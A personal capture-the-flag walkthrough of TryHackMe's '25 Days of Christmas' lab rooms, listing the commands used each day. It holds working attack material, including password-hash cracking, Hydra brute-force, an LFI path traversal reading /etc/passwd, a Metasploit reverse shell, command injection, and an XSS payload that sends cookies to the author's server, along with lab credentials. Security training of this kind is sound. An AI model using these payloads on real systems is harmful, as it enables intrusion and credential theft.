#hashcat-etc-passwd #find #wireshark #nfs

https://tryhackme.com/r/room/25daysofchristmas

---
##### Day 1 - Inventory Management
I created an account an I base64 decoded the cookie to see the patern. Then I used the patern to impersonate `mcinventory`'s profile

##### Day 2 - Arctic Forum
I used gobuster to find the `/sysadmin` page. In the source code on `/sysadmin'`, I've found the github project name with the credentials

##### Day 3 - Evil Elf
I opened the wrong file like a retard and I go stuck 20 minutes.Then I found the `998th` packet with `CTRL+G` and I've found the responses with the `CTRL+F` in `Packet details` 
![[Screenshot_2024-05-21_20-00-59.png]]
For the password hashed, it was found in a /etc/passwd file:
```shell
hashcat -m 1800 -a 0 hashfile rockyou.txt
```
##### Day 4 - Training
A big joke
To find the name of a file with a specific content, type `-H`:
```shell
find ./ -exec grep -H "password" {} \;
```

To find an ip in a file:
```shell
find . -exec grep -HEo '([0-9]{1,3}\.){3}[0-9]{1,3}' {} \; 2> /dev/null
```
The noob way: `[0-9][0-9]\.[0-9]\.[0-9]\.[0-9][0-9]`

##### Day 5 - Ho-Ho-Hosint
Osint - Google - waybackmachine

##### Day 6 - Data Elf-iltration
I can extract data downloaded
![[Screenshot_2024-05-21_22-51-16.png]]

##### Day 7 - Skilling Up
Nmap showed me most of the informations the second day. The first day, ports were closed
```shell
nmap -A -p1-1000 [host]
```

##### Day 8 - SUID Shenanigans
SUID
```shell
find / -user igor -perm 4000 -ls
```

##### Day 9 - Requests
Just had to go on `10.10.169.100:3000/[letter]` which gave me a letter for the flag and another letter for the url to get the next

##### Day 10 - Metasploit-a-ho-ho-ho
I used the `metasploit` exploit `multi/http/struts2_content_type_ognl` to get a reverse shell and I go santa's creds on his home: `santa:rudolphrednosedreindeer`

##### Day 11 - Elf Applications
![[Screenshot_2024-06-02_15-34-47.png]]
I go mysql creds on the ftp
```shell
mysql -u root -h 10.10.31.3 -p
```
The password is `ff912ABD*`

In the database, I got admin user creds `admin:bestpassword`

I had to connect to NFS on port `2049`
```shell
mkdir ./mnt
sudo mount 10.10.31.3:/opt/files ./mnt
```
The file `creds.txt` contain a password `securepassword123`


##### Day 12 - Elfcryption
For the md5sum
```
cat note1.txt.gpg | md5sum
```

For the `.gpg`
```shell
gog -d note1.txt.gpg
```
with password `25daysofchristmas` given in hints

For the second note:
```shell
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2_decrypted.txt
```

##### Day 13 - Accumulate
Enumeration gave me `/retro`

This is a retro gaming blog written by `Wade` and he left a note in a comment on one of his articles with a probable password: `parzival`

Creds: `Wade:parzival`

```shell
xfreerdp /v:10.10.45.206 /u:Wade /p:parzival /dynamic-resolution /kbd:0x0000080c /drive:share,/tmp
```

I used the `PrintNightmare` cve to get a root account

##### Day 14 - Unknown Storage
Information are on the S3 bucket:
https://advent-bucket-one.s3.amazonaws.com/

##### Day 15 - LFI
Capture the page with burp made me intercept the loading of the notes, I've just change it to try to do some LFI and it worked
```text
http://10.10.112.37/get-file/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

And it gave me the user charlie

The `/etc/shadow` file was readable so I got his hashed password

```shell
hashcat -a 0 -m 1800 -O hash /usr/share/wordlists/rockyou.txt
```

The creds are `charlie:password1`

##### Day 16 - File Confusion
**Command to unzip all files**
```shell
unzip \*.zip
```

**Count files with specific metadata**
```shell
file *.txt
```

**Count files in directory**
```shell
ls -1 | wc -l
```

**Command for the password:**
```shell
find ./ -type f -exec grep -H "pass" {} \;
```

##### Day 17 - Hydra-ha-ha-haa
**Post form**
```shell
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.6.131 http-post-form "/login:username=molly&password=^PASS^:Your username or password is incorrect."
```

**ssh**
```shell
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.6.131
```

##### Day 18 - ELF JS
I created an account
Setup a python server
```shell
python3 -m http.server:5050
```
and created a XSS payload to send back the cookie to my python server
```shell
<script>document.location="http://10.14.79.56:5050/?"+document.cookie</script>
```
The admin comes on the page every 2/3 min

##### Day 19 - Commands
The payload
```shell
http://10.10.142.139:3000/api/cmd/cat%20%2fhome%2fbestadmin%2fuser.txt
```

##### Day 20 - Cronjob Privilege Escalation
Nmap for the first

Hydra for sam's password (`chocolate`)
```shell
hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.97.143 -s 4567
```

For the crontab, I added the following in `/home/scripts/clean_up.sh`
```shell
cat /home/ubuntu/flag2.txt > /tmp/flag
```

##### Day 21 & 22 
Read the assembly operations
```shell
r2 -d [binary]
aa
pdf @ main
```

